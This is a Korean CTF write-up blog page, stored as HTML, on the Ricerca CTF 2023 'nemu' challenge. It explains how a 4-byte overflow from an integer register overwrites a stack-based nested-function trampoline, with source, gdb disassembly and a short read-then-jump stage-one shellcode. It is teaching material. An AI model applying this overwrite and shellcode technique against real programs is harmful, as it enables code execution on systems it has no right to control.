@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="비록 대회할 때 풀지는 못 한 문제지만, 대회가 끝난 후 write-up을 보며 풀었는데 꽤나 재밌었던 문제라 정리를 하려고 한다. Analysis문제에서 주어진 코드는 다음과 같다.  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ricerca CTF 2023 nemu">
+<meta property="og:url" content="http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/index.html">
+<meta property="og:site_name" content="p0her">
+<meta property="og:description" content="비록 대회할 때 풀지는 못 한 문제지만, 대회가 끝난 후 write-up을 보며 풀었는데 꽤나 재밌었던 문제라 정리를 하려고 한다. Analysis문제에서 주어진 코드는 다음과 같다.  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-01T12:10:52.000Z">
+<meta property="article:modified_time" content="2023-05-01T12:11:45.324Z">
+<meta property="article:author" content="p0her">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ricerca CTF 2023 nemu</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&text=Ricerca CTF 2023 nemu"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&is_video=false&description=Ricerca CTF 2023 nemu"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ricerca CTF 2023 nemu&body=Check out this article: http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&name=Ricerca CTF 2023 nemu&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&t=Ricerca CTF 2023 nemu"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">2.</span> <span class="toc-text">exploit</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ricerca CTF 2023 nemu
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">p0her</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-01T12:10:52.000Z" class="dt-published" itemprop="datePublished">2023-05-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>비록 대회할 때 풀지는 못 한 문제지만, 대회가 끝난 후 write-up을 보며 풀었는데 꽤나 재밌었던 문제라 정리를 하려고 한다.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>문제에서 주어진 코드는 다음과 같다.</p>
+ <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">readint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint8_t</span> buf[<span class="number">14</span>] = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((buf[i] = <span class="built_in">getchar</span>()) == <span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (buf[i] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">      buf[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">atoi</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">void</span> *op_fp, *read_fp;</span><br><span class="line">  <span class="type">uint64_t</span> operand;</span><br><span class="line">  <span class="type">int32_t</span> r1 = <span class="number">0</span>, r2 = <span class="number">0</span>, r3 = <span class="number">0</span>, a = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int32_t</span>* <span class="title">readreg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getchar</span>() != <span class="string">&#x27;r&#x27;</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">readint</span>()) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">return</span> &amp;r1;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">return</span> &amp;r2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">return</span> &amp;r3;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">return</span> &amp;a;</span><br><span class="line">      <span class="keyword">default</span>: <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">uint32_t</span> <span class="title">readimm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getchar</span>() != <span class="string">&#x27;#&#x27;</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">readint</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Welcome to NEMU!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;We now only have following 6 instructions:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     1) LOAD [imm]: Load value [imm] into ACC register\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     2) MOV  [reg]: Copy data stored in AC register into [reg] register\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     3) INC  [reg]: Increment the value stored in [reg] register\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     4) DBL  [reg]: Double the value stored in [reg] register\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     5) ADDI [imm]: Add value [imm] to the value of ACC register\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     6) ADD  [reg]: Add value stored in [reg] register to the value of ACC register\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;Current register status: \n&quot;</span></span><br><span class="line">      <span class="string">&quot;REG1(r1): 0x%08x\n&quot;</span></span><br><span class="line">      <span class="string">&quot;REG2(r2): 0x%08x\n&quot;</span></span><br><span class="line">      <span class="string">&quot;REG3(r3): 0x%08x\n&quot;</span></span><br><span class="line">      <span class="string">&quot; ACC(r0): 0x%08x\n\n&quot;</span>,</span><br><span class="line">      r1, r2, r3, a</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;opcode: &quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">readint</span>()) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">(<span class="type">uint64_t</span> imm)</span> </span>&#123; a = imm; &#125;</span><br><span class="line">        op_fp = load;</span><br><span class="line">        read_fp = readimm;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">mov</span><span class="params">(<span class="type">uint64_t</span>* reg)</span> </span>&#123; *reg = a; &#125;</span><br><span class="line">        op_fp = mov;</span><br><span class="line">        read_fp = readreg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">inc</span><span class="params">(<span class="type">uint64_t</span>* reg)</span> </span>&#123; *reg += <span class="number">1</span>; &#125;</span><br><span class="line">        op_fp = inc;</span><br><span class="line">        read_fp = readreg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">dbl</span><span class="params">(<span class="type">uint64_t</span>* reg)</span> </span>&#123; *reg *= <span class="number">2</span>; &#125;</span><br><span class="line">        op_fp = dbl;</span><br><span class="line">        read_fp = readreg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">addi</span><span class="params">(<span class="type">uint64_t</span> imm)</span> </span>&#123; a += imm; &#125;</span><br><span class="line">        op_fp = addi;</span><br><span class="line">        read_fp = readimm;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">uint64_t</span>* reg)</span> </span>&#123; a += *reg; &#125;</span><br><span class="line">        op_fp = add;</span><br><span class="line">        read_fp = readreg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;operand: &quot;</span>);</span><br><span class="line">    ((<span class="built_in">void</span> (*)(<span class="type">uint64_t</span>))op_fp)(((<span class="built_in">uint64_t</span>(*)())read_fp)());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">180</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>평범한 C 프로그램과 다르게 함수안에 함수를 선언하고 사용하고 있다. 그러면 이 때 함수가 어떻게 호출이 되는지 궁금해서 디버깅을 해보았다.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">gef➤  i func</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line"><span class="number">0x0000000000001000</span>  _init</span><br><span class="line"><span class="number">0x00000000000010b0</span>  __cxa_finalize@plt</span><br><span class="line"><span class="number">0x00000000000010c0</span>  puts@plt</span><br><span class="line"><span class="number">0x00000000000010d0</span>  __stack_chk_fail@plt</span><br><span class="line"><span class="number">0x00000000000010e0</span>  setbuf@plt</span><br><span class="line"><span class="number">0x00000000000010f0</span>  printf@plt</span><br><span class="line"><span class="number">0x0000000000001100</span>  alarm@plt</span><br><span class="line"><span class="number">0x0000000000001110</span>  getchar@plt</span><br><span class="line"><span class="number">0x0000000000001120</span>  atoi@plt</span><br><span class="line"><span class="number">0x0000000000001130</span>  exit@plt</span><br><span class="line"><span class="number">0x0000000000001140</span>  _start</span><br><span class="line"><span class="number">0x0000000000001170</span>  deregister_tm_clones</span><br><span class="line"><span class="number">0x00000000000011a0</span>  register_tm_clones</span><br><span class="line"><span class="number">0x00000000000011e0</span>  __do_global_dtors_aux</span><br><span class="line"><span class="number">0x0000000000001220</span>  frame_dummy</span><br><span class="line"><span class="number">0x0000000000001229</span>  readint</span><br><span class="line"><span class="number">0x00000000000012c7</span>  readreg</span><br><span class="line"><span class="number">0x000000000000133e</span>  main</span><br><span class="line"><span class="number">0x0000000000001714</span>  readimm</span><br><span class="line"><span class="number">0x0000000000001744</span>  load</span><br><span class="line"><span class="number">0x0000000000001760</span>  mov</span><br><span class="line"><span class="number">0x0000000000001782</span>  inc</span><br><span class="line"><span class="number">0x00000000000017a7</span>  dbl</span><br><span class="line"><span class="number">0x00000000000017cc</span>  addi</span><br><span class="line"><span class="number">0x00000000000017ee</span>  add</span><br><span class="line"><span class="number">0x0000000000001813</span>  init</span><br><span class="line"><span class="number">0x0000000000001860</span>  __libc_csu_init</span><br><span class="line"><span class="number">0x00000000000018d0</span>  __libc_csu_fini</span><br><span class="line"><span class="number">0x00000000000018d8</span>  _fini</span><br></pre></td></tr></table></figure>
+
+<p>먼저, 각 함수를 선언하면 이것이 심볼로 등록되어, 프로그램에 code 영역에 들어가게 된다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000001501 &lt;+451&gt;:	lea    rax,[rbp-0x110]</span><br><span class="line">0x0000000000001508 &lt;+458&gt;:	add    rax,0x10</span><br><span class="line">0x000000000000150c &lt;+462&gt;:	lea    rdx,[rbp-0x110]</span><br><span class="line">0x0000000000001513 &lt;+469&gt;:	mov    DWORD PTR [rax],0xfa1e0ff3</span><br><span class="line">0x0000000000001519 &lt;+475&gt;:	mov    WORD PTR [rax+0x4],0xbb49</span><br><span class="line">0x000000000000151f &lt;+481&gt;:	lea    rcx,[rip+0x2c8]        # 0x17ee &lt;add.3507&gt;</span><br><span class="line">0x0000000000001526 &lt;+488&gt;:	mov    QWORD PTR [rax+0x6],rcx</span><br><span class="line">0x000000000000152a &lt;+492&gt;:	mov    WORD PTR [rax+0xe],0xba49</span><br><span class="line">0x0000000000001530 &lt;+498&gt;:	mov    QWORD PTR [rax+0x10],rdx</span><br><span class="line">0x0000000000001534 &lt;+502&gt;:	mov    DWORD PTR [rax+0x18],0x90e3ff49</span><br></pre></td></tr></table></figure>
+
+<p><code>add</code> 함수를 등록하는 부분 중 일부분을 가져왔는데, 맨 처음에 빈 스택 공간을 <code>rax</code> 레지스터에 등록한 후, <code>rax</code> 에 일정한 오프셋을 더하고, 그 <code>rax</code> 레지스터에 <code>opcode</code> 를 넣게 된다.</p>
+<figure class="highlight plaintext"><figcaption><span>endbr64</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffe214:	movabs r11,0x5555555557ee</span><br><span class="line">0x7fffffffe21e:	movabs r10,0x7fffffffe200</span><br><span class="line">0x7fffffffe228:	rex.WB jmp r11</span><br></pre></td></tr></table></figure>
+
+<p><code>opcode</code> 를 살펴보면, <code>r11</code> , <code>r10</code> 레지스터에 각 각 함수의 주소와, 함수에서 사용하는 변수 (<code>addi</code> 변수에선 <code>a</code>를 사용한다.)의 주소를 넣어주고, 그 함수 주소로 jump를 하는 것을 볼 수 있다. 즉 스택에 opcode가 들어가게 되는데, 발생하는 취약점은 다음 코드에서 볼수 있다.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line">       <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">uint64_t</span>* reg)</span> </span>&#123; a += *reg; &#125;</span><br><span class="line">       op_fp = add;</span><br><span class="line">       read_fp = readreg;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+
+<p>코드의 일 부분을 가져왔는데, 변수 <code>a</code> 는 <code>int32_t</code> 타입이지만, 전달되는 인수는 <code>uint64_t</code> 타입으로, 4byte overflow가 발생한다. 이걸 어떻게 이용하면 좋을까 디버깅을 해본 결과, 다음과 같은 사실을 알 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r0 = rbp - 0x110</span><br><span class="line">r1 = rbp - 0x104</span><br><span class="line">r2 = rbp - 0x108</span><br><span class="line">r3 = rbp - 0x10c</span><br><span class="line">add = rbp - 0x100</span><br></pre></td></tr></table></figure>
+
+<p>그러므로, <code>r1</code> 을 4byte overflow하면, <code>add</code>의 <code>opcode</code> 를 조작할 수 있다. 보호기법을 살펴보면 <code>NX</code>도 없으므로, 옵코드를 넣어주면 된다.</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>이제 이 옵코드를 어떻게 써먹으면 좋을지 생각해보자. <code>r1</code>, <code>r2</code>, <code>r3</code>, <code>r0</code> 이 연속적으로 배치되어 있으므로, 이곳에 쉘코드를 넣고 점프를 뛰면 된다. write-up을 보면 <code>r0</code> 로부터 차례대로 쉘코드를 넣고, <code>r0</code> 로 jmp를 뛴다. 쉘코드를 살펴보자.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    add rdi, 0x10</span><br><span class="line">    xchg rdi, rsi</span><br><span class="line">    xchg eax, edx</span><br><span class="line">    syscall</span><br><span class="line">    jmp rsi</span><br></pre></td></tr></table></figure>
+
+<p>다음과 같이 되어있는데, 디버깅을 해보자</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 0x0000564f04ab86f5 &lt;+951&gt;:	mov    rbx,QWORD PTR [rbp-0x120]</span><br><span class="line">   0x0000564f04ab86fc &lt;+958&gt;:	mov    rdx,QWORD PTR [rbp-0x118]</span><br><span class="line">   0x0000564f04ab8703 &lt;+965&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000564f04ab8708 &lt;+970&gt;:	call   rdx</span><br><span class="line">=&gt; 0x0000564f04ab870a &lt;+972&gt;:	mov    rdi,rax</span><br><span class="line">   0x0000564f04ab870d &lt;+975&gt;:	call   rbx</span><br></pre></td></tr></table></figure>
+
+<p>모든 함수가 호출 될 때 다음과 같은 루틴을 거치는데, 우리가 <code>add</code> 함수를 선택했다고 하면, <code>rbp - 0x120</code> 에서 add 함수의 옵코드가 담겨있는 스택주소를 <code>rbx</code> 에 넣어서 call 해주고, <code>rax</code> 에서 <code>rdi</code> 로 값을 옮겨 인자로 사용해준다. 여기서 우리가 <code>r0</code> 을 선택해주면, <code>rax</code> 에 <code>r0</code> 의 주소가 담기고, <code>rbx</code> 는 우리가 아까 <code>r1</code> 을 4byte overflow 함으로써 덮인 옵코드가 실행된다. 이 떄 우리가 <code>jmp rdi</code> opcode를 덮어주면, <code>r0</code> 로 jmp를 뛰게 되는데, <code>r0</code> 에 우리가 아까 언급했던 쉘코드를 차곡차곡 넣어주면, 결국 그 쉘코드가 실행되게 된다. 이제 쉘코드를 설명해보자면,</p>
+<p>먼저 <code>rdi</code> 에 0x10을 더해준다. 그 후 <code>rdi</code> 와 <code>rsi</code> 를 바꾸게 되는데, 그러면 <code>rsi</code>는 <code>&amp;r0 + 0x10</code> 의 주소를 가진다. <code>xchg eax, edx</code> 는 <code>eax</code> 에 0을 넣어 <code>read</code> syscall을 호출하게끔 해주려고 하는 것이다. 그 후 <code>syscall</code>  을 하게되면 <code>read</code> 가 실행되게 되는데, 그럼  <code>&amp;r0 + 0x10</code> 에 쉘코드를 넣을 수 있고, 그 후 <code>jmp rsi</code> 를 해주면, <code>rsi</code> 는 <code>&amp;r0 + 0x10</code> 로 뛰게 되고, 쉘코드를 실행하게 된다.</p>
